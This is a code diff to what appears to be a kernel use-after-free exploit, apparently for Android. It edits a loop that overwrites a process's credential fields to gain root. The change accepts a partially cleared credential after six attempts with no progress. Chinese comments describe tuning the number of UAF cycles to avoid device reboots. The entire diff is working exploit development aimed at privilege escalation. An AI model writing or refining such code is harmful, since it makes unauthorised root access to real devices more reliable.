@@ -2358,6 +2358,7 @@ int uaf_plant_main(int argc, char **argv)
 	const int cred_field_off[4] = { 4, 12, 20, 28 };
 	const char *cred_field_name[4] = { "uid/gid", "euid/egid", "suid/sgid", "fsuid/fsgid" };
 	int field_done[4] = { 0, 0, 0, 0 };
+	int half_cleared_streak = 0;
 	for (int attempt = 1; attempt <= 24 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1, cgid = 1, cegid = 1;
 		unsigned uids[4], gids[4];
@@ -2405,13 +2406,29 @@ int uaf_plant_main(int argc, char **argv)
 				all8 = 0;
 		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
 		if (ask_child(&uid, &euid, &cgid, &cegid) == 0) {
-			if (uid == 0 && euid == 0 && all8) {
-				rooted = 1;
-				continue;
-			}
-			if (uid == 0 && euid == 0) {
+			if (uid == 0 && euid == 0 && cgid == 0 && cegid == 0) {
+				if (all8) {
+					rooted = 1;
+					continue;
+				}
+				/* 2.0.42：仅剩 suid/sgid/fsuid 等滞留字段时的降级决策。
+				 * 第 19 次实测：suid/sgid 连续 22 个尝试未落，清零循环
+				 * 被拖到 23+ 次尝试、60+ 个 UAF 周期，设备最终在周期中
+				 * 重启——周期次数即内核风险敞口。连续 6 个尝试无进展即
+				 * 带缺交接：rootd 的文件操作按滞留字段受限（39.log 实证
+				 * fsuid=2000 时 root 通道仍可用），换取周期数回落到成功
+				 * 轮的水平。 */
+				if (++half_cleared_streak >= 6) {
+					dprintf(STDOUT_FILENO,
+						"[cred] proceeding with partially cleared cred after %d idle attempts\n",
+						half_cleared_streak);
+					log_proc_uid(g_cred_child_pid);
+					rooted = 1;
+					continue;
+				}
 				dprintf(STDOUT_FILENO,
-					"[cred] uid/euid clear, remaining id fields pending\n");
+					"[cred] uid/euid clear, remaining id fields pending (%d)\n",
+					half_cleared_streak);
 				continue;
 			}
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
